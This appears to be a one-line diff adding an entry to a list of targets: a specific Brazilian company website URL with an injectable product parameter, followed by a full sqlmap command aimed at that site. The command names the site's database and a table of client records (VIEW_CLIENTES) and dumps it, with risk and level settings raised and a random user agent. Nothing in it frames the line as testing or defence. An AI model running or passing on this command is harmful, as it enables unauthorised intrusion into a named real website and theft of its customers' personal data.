@@ -1,0 +1,1 @@
+https://www.dzampier.com.br/index.php?pagina=produtos&acao=detalhar&chave_produto=6 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u https://www.dzampier.com.br/index.php?pagina=produtos&acao=detalhar&chave_produto=6 -D sdzampie_site1 --risk 3 --level 3 --dbms=MySQL -T VIEW_CLIENTES --dump
